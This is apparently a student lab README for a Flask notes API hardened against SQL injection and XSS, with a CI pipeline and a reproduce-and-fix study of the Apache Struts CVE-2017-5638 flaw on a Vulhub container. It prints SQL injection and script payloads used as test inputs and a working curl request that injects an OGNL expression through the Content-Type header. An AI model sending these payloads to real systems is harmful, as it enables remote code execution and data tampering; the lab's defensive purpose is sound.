# Secure Notes API — Work 1

Secure REST API with JWT authentication, SQL-injection and XSS protection, plus a
CI/CD pipeline that runs SAST and SCA on every push.

**Laboratory work:** No. 1 — *Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis*
**Variant:** CVE-2017-5638 (Apache Struts 2, S2-045)
**Student:** Pan Hongzhou · **HDU number:** 23320333

![Security CI](https://github.com/YOUR_GITHUB_USERNAME/secure-notes-api/actions/workflows/ci.yml/badge.svg)

> **Status.** The API, the security controls, the automated test suite, the CI/CD
> pipeline and the CVE stage are complete. 59 tests pass, Bandit and pip-audit are clean,
> and CVE-2017-5638 was reproduced against Vulhub (Struts 2.3.30) and remediated by
> upgrading to 2.3.32 — the same exploit no longer succeeds. What remains is publishing
> the repository so the Actions run and its screenshots can be produced; the pipeline
> link and screenshots are the only unfinished submission items.

---

## Table of contents

1. [Stack and project layout](#stack-and-project-layout)
2. [Quick start](#quick-start)
3. [API reference](#api-reference)
4. [Security measures](#security-measures)
5. [CI/CD pipeline](#cicd-pipeline)
6. [Testing and local evidence](#testing-and-local-evidence)
7. [CVE analysis (CVE-2017-5638)](#cve-analysis-cve-2017-5638)
8. [Submission checklist](#submission-checklist)
9. [Limitations and next steps](#limitations-and-next-steps)

---

## Stack and project layout

| Layer | Choice | Why |
| --- | --- | --- |
| Language / framework | Python 3.12+ / Flask 3.1 | Small, explicit code base; security behaviour is easy to audit |
| Database | SQLite via the standard `sqlite3` module | Zero setup for a laboratory environment; real prepared statements |
| Authentication | JWT (PyJWT, HS256) + bcrypt | Matches the assignment exactly |
| Static analysis (SAST) | Bandit | Python-specific security linter, runs in CI |
| Dependency audit (SCA) | pip-audit | Checks pinned requirements against the PyPI advisory database |
| Linting | Ruff | Fast style/error checks before tests |
| CI/CD | GitHub Actions | Runs on every push and pull request |

```text
secure-notes-api/
├── app/
│   ├── __init__.py          # application factory, security headers, JSON error handlers
│   ├── config.py            # environment-driven configuration (no secrets in git)
│   ├── db.py                # schema, seed users, request-scoped SQLite connection
│   ├── security.py          # bcrypt hashing, JWT issuing/verification, auth decorator
│   ├── serializers.py       # output encoding (HTML escaping) for all user data
│   └── routes/
│       ├── auth.py          # POST /auth/login
│       ├── data.py          # GET  /api/data
│       └── notes.py         # POST /api/notes, GET /api/notes
├── tests/                   # 59 pytest tests (functional + security)
├── scripts/smoke_test.py    # live end-to-end check against a running server
├── cve/s2-045/              # CVE fix: Dockerfile.fixed + docker-compose.fixed.yml
├── docs/
│   ├── cve-2017-5638-plan.md
│   ├── evidence/            # captured output of local test, scan and CVE runs
│   └── screenshots/         # screenshot checklist for the report
├── .github/workflows/ci.yml # test + Bandit + pip-audit
├── requirements.txt         # runtime dependencies (pinned)
├── requirements-dev.txt     # test/scan tooling (pinned)
├── pyproject.toml           # Ruff, pytest and Bandit configuration
└── run.py                   # development entry point
```

## Quick start

PowerShell (Windows):

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements-dev.txt

# A 64-character random secret is mandatory; the app refuses to start without it.
$env:JWT_SECRET = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 64 | ForEach-Object { [char]$_ })
$env:SEED_PASSWORD = "ChangeMe#2024"   # demo accounts only — change it

python run.py
# API is now at http://127.0.0.1:5000
```

Bash (Linux/macOS/CI):

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements-dev.txt
export JWT_SECRET="$(python -c 'import secrets; print(secrets.token_urlsafe(48))')"
export SEED_PASSWORD="ChangeMe#2024"
python run.py
```

The first start creates `instance/app.db` and seeds two accounts:

| Username | Password | Role |
| --- | --- | --- |
| `alice` | `ChangeMe#2024` (or `SEED_PASSWORD`) | user |
| `bob` | `ChangeMe#2024` (or `SEED_PASSWORD`) | user |

Run the test suite and the live smoke test:

```powershell
python -m pytest
python scripts/smoke_test.py --base-url http://127.0.0.1:5000
```

## API reference

All request and response bodies are JSON. Protected endpoints require
`Authorization: Bearer <access_token>`.

| Method | Path | Auth | Description |
| --- | --- | --- | --- |
| `POST` | `/auth/login` | no | Exchange username and password for a JWT |
| `GET` | `/api/data` | yes | List users; optional `?q=` substring filter |
| `POST` | `/api/notes` | yes | Create a note owned by the caller |
| `GET` | `/api/notes` | yes | List only the caller's notes, newest first |

### `POST /auth/login`

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"ChangeMe#2024"}'
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

Errors: `400` for a missing/non-string field, `401` with a deliberately generic
`{"error": "Invalid username or password"}` for bad credentials.

### `GET /api/data`

```bash
TOKEN="<access_token from login>"
curl -s http://127.0.0.1:5000/api/data -H "Authorization: Bearer $TOKEN"
curl -s "http://127.0.0.1:5000/api/data?q=ali" -H "Authorization: Bearer $TOKEN"
```

```json
{
  "count": 2,
  "items": [
    {"id": 1, "username": "alice", "bio": "Backend developer. Loves secure APIs."},
    {"id": 2, "username": "bob", "bio": "QA engineer. Tests everything twice."}
  ]
}
```

Without a token the endpoint returns `401 {"error": "Authentication required"}`.

### `POST /api/notes`

```bash
curl -s -X POST http://127.0.0.1:5000/api/notes \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Lab notes","content":"Prepared statements everywhere."}'
```

`201 Created`:

```json
{
  "note": {
    "id": 1,
    "title": "Lab notes",
    "content": "Prepared statements everywhere.",
    "created_at": "2026-10-19T08:12:00Z"
  }
}
```

The note is bound to the authenticated user; `bob` cannot read or modify `alice`'s
notes because every query filters on `user_id` taken from the verified JWT.

### `GET /api/notes`

Returns `{"count": N, "items": [...]}` with only the caller's notes.

## Security measures

### 1. SQL injection protection (OWASP A03:2021 — Injection)

Every SQL statement is a **static string with `?` placeholders**; user input is passed
as a bound parameter and never concatenated into the query text.

- Login lookup: `app/security.py` → `SELECT ... FROM users WHERE username = ?`.
- Search filter: `app/routes/data.py` → `WHERE username LIKE ?`; even the `%`
  wildcards are part of the bound value, not the SQL.
- Note insert/list: `app/routes/notes.py` → `INSERT ... VALUES (?, ?, ?)` and
  `WHERE user_id = ?`.

Tests send `' OR '1'='1`, `alice'--`, `'; DROP TABLE users; --`,
`' UNION SELECT password_hash FROM users --` to both the login and the search
parameter. Each attempt returns `401`/zero rows, and the follow-up legitimate login
still succeeds, proving the schema was not damaged.

### 2. XSS protection (OWASP A03:2021 — Injection)

All user-controlled strings are **HTML-escaped on output** in
`app/serializers.py` (`html.escape(value, quote=True)`), so a stored value such as
`<script>alert(1)</script>` is returned as
`&lt;script&gt;alert(1)&lt;/script&gt;`. The database keeps the original text; only the
serialized representation is encoded. This is the output-encoding pattern the
assignment asks for (the Flask equivalent of Express `escape()`), applied in addition
to the fact that the API always answers with `application/json`, never `text/html`.

Responses also carry `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`,
`X-Content-Type-Options: nosniff` and `X-Frame-Options: DENY`.

Tests create notes with `<script>` and `<img onerror>` payloads and assert that the
raw tags never appear in the create or list responses while the escaped form does.

### 3. Authentication (OWASP A07:2021 — Identification and Authentication Failures)

- **Password storage:** bcrypt with a per-password random salt and cost factor 12;
  plaintext passwords are never stored or logged. Passwords longer than bcrypt's
  72-byte limit are rejected.
- **JWT:** HS256, signed with a secret of at least 32 characters, lifetime 3600 s,
  claims `sub`, `username`, `role`, `iat`, `exp`, `jti`. Verification pins the
  algorithm to `HS256` (defeating `alg: none` and algorithm-confusion attacks) and
  requires `exp`, `iat` and `sub`.
- **Middleware:** `auth_required` parses the `Authorization: Bearer` header strictly,
  verifies the signature/expiry, converts `sub` to an integer, and re-checks that the
  account still exists in the database. Any failure yields `401`.
- **Enumeration resistance:** unknown user and wrong password return the identical
  message and status; an unknown username still performs a dummy bcrypt comparison so
  response time does not reveal whether the account exists.
- **No credential leakage:** `/api/data` exposes only `id`, `username`, `bio`; the
  login response contains only the token metadata.

### 4. Additional hardening

| Control | Implementation |
| --- | --- |
| Secret management | `JWT_SECRET` and `SEED_PASSWORD` come from the environment; the app refuses to start with a missing or short secret |
| Request size limit | `MAX_CONTENT_LENGTH = 16 KiB` → `413` |
| Input validation | types, lengths (username 64, password 128, query 64, title 120, content 5000) checked before use |
| Error handling | JSON `400/401/404/405/413/500`; no stack traces or SQL details leak to clients |
| Tenant isolation | notes are filtered by `user_id` from the verified token |
| Cache | `Cache-Control: no-store` on every response |
| Debug mode | `debug=False` in `run.py`; production should run behind a WSGI server |

## CI/CD pipeline

`.github/workflows/ci.yml` runs on every push to any branch and on every pull request.
Three jobs, all pinned to Python 3.12 on `ubuntu-latest`:

| Job | What it does | Artifact |
| --- | --- | --- |
| `test` | installs pinned deps, runs `ruff check .`, then the 59 pytest tests | — |
| `sast` | runs `bandit -r app -f txt`, writes the report to the job summary | `bandit-report` |
| `sca` | runs `pip-audit -r requirements.txt --desc` in console and JSON form | `pip-audit-report` |

`needs: test` means Bandit and pip-audit only run after the tests pass. Both reports are
also appended to the **Actions run summary**, which is the easiest page to screenshot.

**Screenshots of the reports must be taken from the Actions tab of the public
repository** (see [`docs/screenshots/README.md`](docs/screenshots/README.md)). They
cannot be produced until the repository is pushed and the first workflow run finishes.

Latest successful run: `TODO — replace with the Actions run URL after the first push.`

Local equivalents (real output captured in [`docs/evidence/`](docs/evidence/)):

```text
$ python -m pytest
59 passed in 1.79s

$ python -m bandit -r app -f txt
No issues identified.

$ python -m pip_audit --desc
No known vulnerabilities found
```

## Testing and local evidence

| Test file | Focus | Tests |
| --- | --- | --- |
| `tests/test_auth.py` | login success/failure, input validation, SQLi payloads, expired/foreign/`alg:none`/tampered tokens, deleted user | 27 |
| `tests/test_data.py` | auth requirement, directory contents, credential leakage, SQLi-safe search, query length | 8 |
| `tests/test_notes.py` | auth requirement, XSS escaping, raw storage, tenant isolation, SQLi in content, validation | 16 |
| `tests/test_security.py` | security headers, bcrypt storage, unique salts, JSON 404/405/413, malformed JSON | 8 |

**59 tests total.**

Captured evidence (generated on 2026-10-19, Python 3.14.7, Windows):

- [`docs/evidence/pytest.txt`](docs/evidence/pytest.txt) — 59 passed
- [`docs/evidence/ruff.txt`](docs/evidence/ruff.txt) — all checks passed
- [`docs/evidence/bandit.txt`](docs/evidence/bandit.txt) — no issues identified
- [`docs/evidence/pip-audit.txt`](docs/evidence/pip-audit.txt) — no known vulnerabilities
- [`docs/evidence/smoke-test.txt`](docs/evidence/smoke-test.txt) — 13/13 live checks passed

The live smoke test exercises the running server over HTTP: unauthorized access,
login, wrong password, SQLi login, authenticated data retrieval, SQLi search, note
creation with an XSS payload, escaped output, and unauthorized note listing.

## CVE analysis (CVE-2017-5638)

**Execution status: completed on 2026-10-19.** The experiment ran on Docker Desktop
29.8.2 with WSL 2.6.1 on Windows 11 22H2. The vulnerable target was the Vulhub
`struts2/s2-045` image (`vulhub/struts2:2.3.30`); the fixed build is the same application
with `struts2-core` upgraded to **2.3.32**. Full commands, fix files and raw output are in
[`cve/s2-045/README.md`](cve/s2-045/README.md).

**Vulnerability.** Apache Struts 2 evaluates the `Content-Type` header of a multipart
request as an OGNL expression. A crafted header such as
`%{(#_='multipart/form-data')...}` is parsed by the Jakarta multipart parser; the parser
raises an exception that includes the raw header, and Struts 2's localization/OGNL
machinery evaluates that text. The result is unauthenticated remote code execution in
the context of the application server.

**Affected versions:** Struts 2.3.5 through 2.3.31 and 2.5 through 2.5.10.
**Fixed in:** 2.3.32 / 2.5.10.1. **CVSS v3:** 10.0 (network, no privileges, no user
interaction, full confidentiality/integrity/availability impact).

### Reproduction

```bash
docker compose up -d
curl -i -s -X POST http://127.0.0.1:8080/ \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data" \
  --data-binary ""
```

Observed response:

```http
HTTP/1.1 200 OK
vulhub: 54289
Content-Type: text/html; charset=UTF-8
Server: Jetty(9.2.11.v20150529)
```

The value `233 * 233 = 54289` was computed by the server, which proves arbitrary OGNL
evaluation. Replacing the expression with a `ProcessBuilder` payload that runs `id`
returned:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The container runs as root, so the impact inside the container is full command execution.
See [`docs/evidence/cve/02-vulnerable-rce.txt`](docs/evidence/cve/02-vulnerable-rce.txt).

![CVE-2017-5638 exploitation on the vulnerable Struts 2.3.30 build](docs/screenshots/11-exploit-before.png)

*Figure 2. Vulnerable build: `vulhub: 54289` and `uid=0(root)` from the same console session.*

### Root cause

1. A multipart request reaches `JakartaMultiPartRequest.parseRequest()`.
2. The parser rejects the malformed `Content-Type` and builds an error message through
   `LocalizedTextUtil.findText(...)`, passing the raw header as a message parameter.
3. Struts 2 message rendering calls `TextParseUtil.translateVariables()`, which evaluates
   `%{...}` sequences as OGNL.
4. The attacker controls that expression; clearing the context restrictions and using
   `ProcessBuilder` turns it into arbitrary command execution.

In one sentence: untrusted request metadata is fed into a message-localization path that
performs OGNL evaluation, so the header becomes code (CWE-917, expression-language
injection).

### Fix

The fix is an upgrade, not a filter: `cve/s2-045/Dockerfile.fixed` starts from the
vulnerable image and changes the dependency in `/usr/src/pom.xml` from 2.3.30 to 2.3.32,
then rebuilds:

```dockerfile
RUN sed -i 's|<version>2.3.30</version>|<version>2.3.32</version>|' pom.xml \
    && rm -rf /root/.m2/repository/org/apache/struts/struts2-core/2.3.30 \
    && rm -rf target
```

```bash
docker compose -f docker-compose.fixed.yml build
docker compose -f docker-compose.fixed.yml up -d
```

2.3.32 is the first 2.3.x release containing the S2-045 fix. The patched
message-localization path no longer evaluates untrusted message parameters as OGNL, so a
`Content-Type` containing `%{...}` is treated as plain text.

### Verification

| Check | 2.3.30 (vulnerable) | 2.3.32 (fixed) |
| --- | --- | --- |
| `vulhub` response header | `vulhub: 54289` | absent |
| `id` command output | `uid=0(root) ...` | absent |
| Normal upload page | HTTP 200 | HTTP 200 |
| Loaded `struts2-core` | 2.3.30 | 2.3.32 |

The same two requests were replayed against the fixed build and both returned the normal
"Struts2 Showcase - Fileupload sample" page. The fixed container's local Maven repository
contains `struts2-core-2.3.32.jar`.

![Same requests against the fixed Struts 2.3.32 build](docs/screenshots/13-exploit-after.png)

*Figure 3. Fixed build: the same requests produce no `vulhub` header and no command output.*

### Evidence

| File | Content |
| --- | --- |
| [`docs/evidence/cve/00-docker-ps.txt`](docs/evidence/cve/00-docker-ps.txt) | both containers running |
| [`docs/evidence/cve/01-vulnerable-header.txt`](docs/evidence/cve/01-vulnerable-header.txt) | `vulhub: 54289` |
| [`docs/evidence/cve/02-vulnerable-rce.txt`](docs/evidence/cve/02-vulnerable-rce.txt) | `uid=0(root)` |
| [`docs/evidence/cve/03-fixed-version.txt`](docs/evidence/cve/03-fixed-version.txt) | `struts2-core-2.3.32.jar` |
| [`docs/evidence/cve/04-fixed-header.txt`](docs/evidence/cve/04-fixed-header.txt) | same header request, no execution |
| [`docs/evidence/cve/05-fixed-rce.txt`](docs/evidence/cve/05-fixed-rce.txt) | same RCE request, normal page |
| [`docs/evidence/cve/06-regression.txt`](docs/evidence/cve/06-regression.txt) | normal file upload still returns HTTP 200 |

**Environment note.** On this machine `127.0.0.1:8080` was already occupied by a local
Chromium/CEF debugging listener, so the vulnerable container was reached via the LAN
address (`http://192.168.3.9:8080/`) and the fixed build was published on 8081. The port
is not part of the vulnerability; on a clean host `localhost:8080` works as documented by
Vulhub.

**Scope note.** The vulnerable container runs as root, but it is isolated by Docker; the
demonstrated impact is command execution inside the container, not on the Windows host.

## Submission checklist

| Assignment requirement | Where |
| --- | --- |
| Public git repository with project code | this repository (push pending) |
| README: project and API description | this file, [API reference](#api-reference) |
| README: security measures in detail | [Security measures](#security-measures) |
| README: SAST/SCA screenshots from Actions | `docs/screenshots/` (to be captured after push) |
| README: CVE ID and description | [CVE analysis](#cve-analysis-cve-2017-5638) |
| README: reproduction sequence with commands/screenshots | [CVE analysis](#cve-analysis-cve-2017-5638) + [`cve/s2-045/README.md`](cve/s2-045/README.md) |
| README: root cause analysis | section above + [`cve/s2-045/README.md`](cve/s2-045/README.md) |
| README: fix description and proof of elimination | section above + [`docs/evidence/cve/`](docs/evidence/cve/) |
| Link to last successful pipeline run | `TODO` — Actions run URL |
| Folder with fixes (compose/Dockerfile/source) | [`cve/s2-045/`](cve/s2-045/) (`Dockerfile.fixed`, `docker-compose.fixed.yml`) |
| Report with title page (work, variant, name, HDU number) | `Work1_Report_Pan_Hongzhou.docx` in the parent folder |

## Limitations and next steps

- Screenshots from GitHub Actions require the repository to be pushed first; the CVE
  evidence is captured as console transcripts in `docs/evidence/cve/` and should be
  accompanied by screen captures from Docker Desktop/curl if the instructor requires
  them.
- The CVE experiment used the 2.3.x branch (2.3.30 → 2.3.32). The 2.5.x branch is fixed
  by 2.5.10.1; the same analysis applies.
- SQLite is appropriate for the lab; a production deployment would use PostgreSQL and
  a migration tool.
- No refresh-token rotation or server-side revocation list: a stolen access token is
  valid until `exp` (1 hour). A production system would add short access tokens plus
  refresh tokens and a `jti` denylist.
- No login rate limiting yet; it is a sensible next hardening step (e.g. Flask-Limiter).
- The assignment's demo accounts share one seed password; change `SEED_PASSWORD` and
  replace the seeding mechanism before any real use.

## License

MIT — educational use.
